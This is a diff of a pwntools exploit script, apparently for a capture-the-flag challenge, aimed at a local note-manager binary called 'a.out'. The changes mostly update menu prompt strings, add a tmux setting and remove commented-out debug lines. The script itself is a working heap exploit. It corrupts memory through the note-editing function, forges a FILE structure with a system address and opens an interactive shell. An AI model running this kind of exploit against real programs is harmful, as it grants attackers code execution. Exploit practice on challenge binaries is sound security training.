@@ -4,6 +4,7 @@ from functools import wraps
 from IO_FILE_plus import *
 ELF_name = 'a.out'
 context.log_level = "info"
+context.terminal = ["tmux","splitw","-h"]
 elf = context.binary = ELF(ELF_name)
 #from io_file import fake_file
 #write_got = elf.symbols['read']
@@ -32,7 +33,7 @@ csu_end_addr = 0x4005e6
 Welcome use the notes
 1. add your note
 2. del your note
-3. modify the tips
+3. edit the note
 4. show the notes
 5. show all tips
 6. exit the note manager
@@ -52,7 +53,7 @@ def add_note(note_id,context):
     io.sendline("1")
     io.recvuntil("Please input the note id\n")
     io.sendline(note_id)
-    io.recvuntil("Please input the notes\n")
+    io.recvuntil("Please input the notes brief introduction\n")
     io.sendline(context)
     #pass
 @show_message
@@ -67,9 +68,9 @@ def del_note( note_id ):
 def modify_note(note_id,tip):
     #send 3
     io.sendline("3")
-    io.recvline("Please input which id you edit its tip\n")
+    io.recvline("Please input note id\n")
     io.sendline(note_id)
-    io.recvline("Please input your tips for its tip\n")
+    io.recvline("Please input the context\n")
     io.sendline(tip)
     #pass
 @show_message
@@ -202,16 +203,9 @@ modify_note("4 1080","tipkkkkkkkk")  #malloc(p4) 修改任意值
 fake_plus = "A"*50+'\x00'
 #leak_address()
 add_note("8","testdddd")
-#print(type(get_str_finish_jmp()))
-#print(type(p64(libc_address)))
+
 modify_note("8 1080",get_str_finish_jmp()+(p64(system_address)+p64(system_address)).decode('unicode-escape'))
-#print(str(fake_file))
 
-#add_note("6 1000","test6666")
-#leak_address()
 
-#leak_note = leak_address()
-#print(leak_note)
 
-#exit_note()
 io.interactive()
